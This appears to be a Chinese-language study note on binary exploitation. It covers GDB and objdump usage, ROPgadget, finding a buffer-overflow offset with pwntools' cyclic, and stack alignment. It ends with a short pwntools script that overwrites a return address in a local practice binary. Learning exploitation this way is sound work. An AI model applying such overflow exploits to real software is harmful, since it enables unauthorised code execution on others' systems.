# Exploit
## Disassembly Tool - GDB
- 設定成 intel 版本
```
set disassembly-flavor intel

```
- 查看組語 / 反編譯
```
lay <asm/src>
```
- 常用參數介紹
    - `b <func>` 設定 Break point
    - `r` 開始執行
    - `ni` 執行下一個指令，如果是 func 直接執行完成
    - `si` 執行下一個指令，逐行執行 func 指令
    - `continue` 執行至斷點
    - `x/[Size Modifiers][Format]` 顯示記憶體資料
    - Size
        - b(byte)/1 byte (8-bit)
        - h(Halfword)/2 byte (16-bit)
        - w(Word)/4 byte (32-bit)
        - g(Giant Word)/8 byte(64-bit)
    - Format
        - o octal
        - x hexadecimal
        - b binary
        - s string
        - i 組合語言


## Disassembly Tool - objdump
- 看組語
```
objdump -d <binary>
```

## Find ROP
- **ROPgadget**
```
sudo -H python3 -m pip install ROPgadget
```
```
ROPgadget --binary <$binary> (--only <$command>)
```
## Finding Offset
- 找出 padding 長度
    - 通靈
        - 這部份我可能沒有
    - GDB
    - cyclic in pwntools

- 利用 cyclic 去產生連續字串
- ![](https://hackmd.io/_uploads/SJH-v2wPh.png)
- 利用 gdb 去找長度
- ![](https://hackmd.io/_uploads/HJ94DnDDn.png)
- 剛好 6c 就在 l
```
cyclic_find('laaa')
```
- return 位置就在 buf 後面 約 44 bytes

### Stack Alignment
- 在尋找 Return Address 的位置時可能會發現一些奇怪的地方
- 明明 Buf 大小就沒有設定那麼大，padding 為什麼那麼大
- 針對區域變數如果只有 1 byte 或不到 4 bytes 的資料對齊調整 (32 位元)

## Exploit
- objdump 查看函數位址
    - ![](https://hackmd.io/_uploads/SytQinwvh.png)
    - ![](https://hackmd.io/_uploads/SJY4jnvwh.png)

- 寫 code 攻擊
```python=
from pwn import *

r = process("./pwn")

padding = (b"a"*44)
add = p32(0x080491c6)
r.sendline(padding+add)
